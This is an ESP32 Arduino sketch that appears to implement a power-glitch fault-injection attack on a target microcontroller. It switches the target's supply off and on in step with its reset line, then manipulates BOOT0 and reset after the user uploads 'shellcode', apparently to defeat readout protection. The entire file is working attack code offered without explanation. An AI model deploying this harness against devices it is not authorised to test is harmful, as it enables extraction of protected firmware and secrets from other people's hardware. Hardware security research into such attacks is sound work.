#include <Arduino.h>
#include <HardwareSerial.h>

#define DUT_TX 17
#define DUT_RX 16

#define POW1 2
#define POW2 4

#define NRST 15
#define BOOT0 5

HardwareSerial DutSerial(2);

void DutPowerOn() {
  digitalWrite(POW1, HIGH);
  digitalWrite(POW2, HIGH);
}

void DutPowerOff() {
  digitalWrite(POW1, LOW);
  digitalWrite(POW2, LOW);
}

void setup() {
  pinMode(POW1, OUTPUT);
  pinMode(POW2, OUTPUT);
  pinMode(BOOT0, OUTPUT);
  pinMode(NRST, INPUT);
  digitalWrite(BOOT0, HIGH);
  DutPowerOn();

  Serial.begin(115200);
  DutSerial.begin(9600, SERIAL_8N1, DUT_RX, DUT_TX); // Use SERIAL_8N1 for 8 data bits, no parity, and 1 stop bit
  Serial.println("ESP32 ready, press any button when shellcode is uploaded and debugger is PHYSICALLY disconnected\n");
}

boolean haveReadChar = false;
boolean alreadyGlitched = false;

void serialParsingLoop() {
  if (DutSerial.available()) {
    Serial.write(DutSerial.read());
  }
  if (Serial.available()) {
    haveReadChar = true;
    DutSerial.write(Serial.read());
  }
}

void glitch() {
  Serial.printf("NRST before glitching = %d\n", digitalRead(NRST));
  noInterrupts();
  uint32_t startMicros = micros();
  DutPowerOff();
  while (digitalRead(NRST));
  DutPowerOn();
  uint32_t elapsedMicros = micros() - startMicros;
  interrupts();
  Serial.printf("Glitched in %d microseconds\n", elapsedMicros);
  delay(1000);
  digitalWrite(BOOT0, LOW);
  pinMode(NRST, OUTPUT);
  digitalWrite(NRST, LOW);
  delay(500);
  digitalWrite(NRST, HIGH);
  pinMode(NRST, INPUT);
  delay(1000);
}

void loop() {
  serialParsingLoop();
  if (alreadyGlitched || !haveReadChar) {
    return;
  }
  alreadyGlitched = true;
  glitch();
}
